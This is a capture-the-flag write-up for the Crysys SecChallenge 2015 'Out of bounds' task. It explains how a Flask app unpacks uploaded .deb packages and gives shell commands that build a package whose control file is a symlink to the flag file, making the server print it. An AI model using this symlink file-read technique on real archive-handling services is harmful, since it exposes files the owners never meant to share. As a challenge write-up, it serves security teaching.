Ubuntu Package Info Challenge
=============================

> Writeup for Crysys SecChallenge 2015. The original challenges are available on avatao.com.

## Out of bounds (175 points)

The source of a python Flask webapp was given, which can show various infos about .deb packets. The .deb packages are *ar* archives; here is a breif summary of its basic contents:
 - *control.tar.gz*
     + *control*: description of the package, dependencies, etc...
     + *md5sums*: md5 sums of the installed files
 - *data.tar.gz*
     + */...*: the actual file structure to be install
 - *debian-binary*: the debian package format (nowadays usually "2.0")

```bash
cd /tmp/packageStore/ && ar vx package.deb && tar -xzvf control.tar.gz
```
The webapp uploads the selected package to a tmp directory, then uncompress it. Form the uncompressed package it selects the *control.tar.gz*, uncompress it as well, and open the *control* file.

It is clear, that the target is `/var/flag/flag2`, somehow we should read this.

The trick: instead of a 'normal' file use a link which points to `/var/flag/flag2`, thus the flag will be printed!

```bash
ln -s /var/flag/flag2 control
tar -czf control.tar.gz control
ar q flag.deb control.tar.gz
```

And just upload the `flag.deb` binary to get the flag!